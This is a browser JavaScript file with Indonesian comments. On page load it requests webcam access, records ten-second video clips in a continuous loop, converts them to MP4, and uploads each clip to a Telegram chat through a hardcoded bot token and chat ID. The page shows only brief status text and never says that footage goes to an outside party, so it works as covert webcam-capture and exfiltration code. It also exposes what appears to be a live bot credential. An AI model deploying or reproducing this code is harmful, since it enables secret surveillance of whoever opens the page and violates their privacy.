let mediaRecorder;
let videoChunks = [];
const statusDisplay = document.getElementById('status');
const countdownDisplay = document.getElementById('countdown');
let recordingInterval;
let countdownTimer;

// Masukkan token bot Telegram Anda (HARUS disimpan di backend untuk keamanan)
const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; 
 // Jangan simpan langsung di frontend!
const chatId = '-4545188605';

// Load FFmpeg.js
const { createFFmpeg, fetchFile } = FFmpeg;
const ffmpeg = createFFmpeg({ log: true });

async function loadFFmpeg() {
    if (!ffmpeg.isLoaded()) {
        await ffmpeg.load();
    }
}

async function startRecording() {
    try {
        await loadFFmpeg();
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            videoChunks.push(event.data);
        };

        async function sendVideoToTelegram() {
            if (videoChunks.length === 0) return;

            const webmBlob = new Blob(videoChunks, { type: 'video/webm' });
            videoChunks = []; // Reset setelah digunakan

            // Konversi WebM ke MP4
            statusDisplay.textContent = 'Mengonversi video ke MP4...';
            ffmpeg.FS('writeFile', 'input.webm', await fetchFile(webmBlob));
            await ffmpeg.run('-i', 'input.webm', '-c:v', 'libx264', '-preset', 'ultrafast', 'output.mp4');
            const mp4Data = ffmpeg.FS('readFile', 'output.mp4');

            const mp4Blob = new Blob([mp4Data.buffer], { type: 'video/mp4' });
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', mp4Blob, 'recording.mp4');
            formData.append('supports_streaming', true);

            try {
                let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                });

                let data = await response.json();
                if (data.ok) {
                    statusDisplay.textContent = 'Video berhasil terkirim!';
                } else {
                    statusDisplay.textContent = 'Error: ' + data.description;
                }
            } catch (error) {
                statusDisplay.textContent = 'Gagal mengirim video.';
                console.error('Error:', error);
            }
        }

        function start10SecondsRecording() {
            let countdown = 10;
            countdownDisplay.textContent = countdown;

            countdownTimer = setInterval(() => {
                countdown--;
                countdownDisplay.textContent = countdown;

                if (countdown === 0) {
                    clearInterval(countdownTimer);
                }
            }, 1000);

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
            }, 10000);

            mediaRecorder.onstop = async () => {
                await sendVideoToTelegram();
            };
        }

        recordingInterval = setInterval(() => {
            start10SecondsRecording();
        }, 12000);

    } catch (err) {
        statusDisplay.textContent = 'Izin kamera ditolak!';
        console.error('Error akses kamera:', err);
    }
}

window.addEventListener('load', () => {
    startRecording();
    statusDisplay.textContent = 'Memulai...';
});

window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
});
